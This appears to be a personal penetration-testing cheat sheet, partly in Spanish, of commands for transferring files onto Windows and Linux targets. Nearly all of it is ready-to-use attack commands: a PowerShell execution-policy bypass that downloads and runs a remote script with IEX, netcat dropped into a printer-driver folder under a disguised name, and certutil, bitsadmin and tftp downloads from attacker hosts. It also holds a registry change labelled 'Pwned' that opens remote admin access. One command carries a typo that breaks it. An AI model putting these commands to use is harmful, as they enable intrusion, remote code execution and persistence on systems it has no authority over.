# Windows Linux Commands For Files Transfers
```bash
Windows Commads
IWR( )
- powershell.exe -command iwr -Uri http://10.10.16.4/file -OutFile C:\Temp\file
- powershell.exe iwr -uri 10.10.16.4/file -o C:\Temp\file
- powershell iwr 10.10.16.4/file -o C:\Temp\file
- powershell Invoke-WebRequest "http://10.50.102.157:800/nc64.exe" -OutFile "C:\Windows\System32\spool\drivers\color\\Pro-nc64.exe"
- powershell.exe -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('http://10.200.101.200:20003/PST.ps1')"
```

# Certutil
- certutil -urlcache -f http://10.10.16.4/file file
- certutil -urlcache -split -f http://10.10.16.4/file file 

# Bitsadmin
- bitsadmin /transfer job http://10.10.16.4/file C:\Temp\file

# Curl
- curl http://10.10.16.4/file -o file

# Wget
- powershell wget http://10.10.16.4/file -OutFile file
- powershell.exe wget http://10.10.16.4/file -OutFile file
# Powershell
- powershell.exe (New-Object System.Net.WebClient).DonwloadFile('http://10.10.16.4/file', 'file')

# SMB
- copy \\10.10.16.4\smbFolder\file 
- net use x: \\10.10.16.4\smbFolder\file; cd x; copy \\10.10.16.4\file

# TFTP
Es necesario usar el modulo Auxiliar Msf Server/tftp
- tftp -i 10.10.16.4 GET file.txt


# Linux Commands 
Servidor Web Para compartir archivos
1.- python3 -m http.server 80
2.- Servidor por SMB -- impacket-smbserver smbFolder $(pwd) -smb2support
3.- msfconsole --> TFTP
4.-


# LocalAccountTokenFilterPolicy - Pwned
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

# Enumeracion de Pogramas
tasklist /V | findstr <programa>
